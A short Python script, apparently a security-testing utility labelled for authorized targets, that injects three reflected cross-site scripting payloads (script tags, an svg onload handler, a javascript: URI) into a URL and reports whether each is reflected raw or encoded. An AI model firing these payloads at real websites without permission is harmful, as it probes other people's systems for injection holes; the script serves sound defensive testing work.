#!/usr/bin/env python3
import argparse
import html
import urllib.parse
import urllib.request


PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><svg onload=alert(1)>",
    "javascript:alert(1)",
]


def main() -> None:
    parser = argparse.ArgumentParser(description="Reflected XSS payload tester for authorized targets")
    parser.add_argument("url_template", help="Use FUZZ where payload should be inserted")
    args = parser.parse_args()
    for payload in PAYLOADS:
        url = args.url_template.replace("FUZZ", urllib.parse.quote(payload))
        try:
            body = urllib.request.urlopen(url, timeout=10).read().decode("utf-8", "ignore")
        except Exception as exc:
            print(f"ERROR {payload!r}: {exc}")
            continue
        reflected_raw = payload in body
        reflected_encoded = html.escape(payload) in body
        status = "raw-reflection" if reflected_raw else "encoded-reflection" if reflected_encoded else "not-reflected"
        print(f"{status:18} {payload}")


if __name__ == "__main__":
    main()
